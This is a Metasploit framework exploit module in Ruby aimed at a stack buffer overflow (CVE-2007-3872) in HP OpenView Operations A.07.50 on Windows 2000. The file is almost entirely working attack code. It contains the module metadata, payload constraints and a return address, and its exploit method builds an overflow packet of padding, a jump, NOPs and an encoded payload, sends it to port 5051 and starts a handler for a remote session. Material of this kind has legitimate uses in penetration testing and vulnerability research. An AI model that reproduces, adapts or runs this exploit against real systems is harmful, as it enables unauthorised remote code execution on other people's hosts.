##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = AverageRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'HP OpenView Operations OVTrace Buffer Overflow',
      'Description'    => %q{
          This module exploits a stack buffer overflow in HP OpenView Operations version A.07.50.
        By sending a specially crafted packet, a remote attacker may be able to execute arbitrary code.
      },
      'Author'         => 'MC',
      'References'     =>
        [
          [ 'CVE', '2007-3872' ],
          [ 'OSVDB', '39527' ],
          [ 'BID', '25255' ],
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
        },
      'Payload'        =>
        {
          'Space'    => 800,
          'BadChars' => "\x0a\x0d\x00",
          'PrependEncoder' => "\x81\xc4\xff\xef\xff\xff\x44",
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Windows 2000 Advanced Server All English',     { 'Ret' => 0x75022ac4 } ],
        ],
      'Privileged'     => true,
      'DefaultTarget'  => 0,
      'DisclosureDate' => '2007-08-09'))

    register_options([Opt::RPORT(5051)])
  end

  def exploit
    connect

    sploit =  "\x0f\x00\x00\x06\x00" + rand_text_english(62)
    sploit << Rex::Arch::X86.jmp_short(6) + make_nops(2)
    sploit << [target.ret].pack('V') + payload.encoded
    sploit << rand_text_english(2024)

    print_status("Trying target #{target.name}...")
    sock.put(sploit)

    select(nil,nil,nil,3) # =(

    handler
    disconnect
  end
end
